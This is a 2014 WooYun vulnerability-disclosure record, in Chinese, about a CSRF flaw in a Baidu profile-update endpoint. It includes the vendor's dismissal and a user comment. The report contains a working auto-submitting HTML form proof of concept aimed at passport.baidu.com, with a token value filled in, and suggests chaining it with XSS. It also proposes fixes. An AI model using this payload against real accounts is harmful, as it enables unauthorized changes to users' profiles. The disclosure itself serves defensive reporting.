{"id": 54902, "wybug_id": "wooyun-2014-062905", "wybug_title": "百度修改用户信息接口crsf漏洞， 结合xss可以修改用户信息", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2014-07-09 18:26", "wybug_open_date": "2014-07-10 11:36", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 百度修改用户信息接口crsf漏洞， 结合xss可以修改用户信息 详细说明：  \n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><title>tt</title></head><body><form id=\"myForm\" action=\"http://passport.baidu.com/v2/?ucenterset\" method=\"post\"> <input name=\"jump_url\" value=\"http://www.baidu.com/p/setting/profile/proxy\" type=\"text\"  /><input name=\"bdstoken\" value=\"7ba43e67cc5cc904b8ebb2ff787ecac6\" type=\"text\"  /> <input name=\"ie\" value=\"utf8\" type=\"text\"  /><input name=\"tpl\" value=\"pcs\" type=\"text\"  /> <input name=\"passport_highschool_0_enter_year\" value=\"2013\" type=\"text\"  /> <input name=\"passport_highschool_0_school_name\" value=\"北京大学\" type=\"text\"  /> <input type=\"submit\" name=\"Button1\" value=\"Button\" id=\"Button1\" /></form> <script type=\"text/javascript\">document.getElementById('myForm').submit();     </script></body> </html>\n如果这段代码被iframe, 就可以修改用户资料了当然这里百度加了一个token验证， 但是token在前端页面有展示(http://www.baidu.com/p/setting/profile/education, 查看源码)现在只需要一枚xss漏洞， 就可以轻松搞定（虽然我现在还没有）   漏洞证明：  由于目前没有找到合适的xss漏洞， 获取token暂时只能自己玩自己   修复方案：  http://passport.baidu.com/v2/?ucenterset当然不限于此接口， 所有跟着接口策略相同的(token策略)加refer判断， 最好是强refer, 对应的入口页面加frame策略token 能起到一定作用， 但是其他地方一旦报出xss漏洞， 这个就无效了   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-07-10 11:36 厂商回复： 如果存在XSS漏洞，直接可以修改用户信息。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-26 15:21 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  洞主你有点逗啊，什么叫如果存在xss。。。如果真的站内存在xss的话那除了验证码防御还有用以外，什么token，refere防御就都失效了。这乌云审核人员竟然这样的洞也给审核通过我也是醉了。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}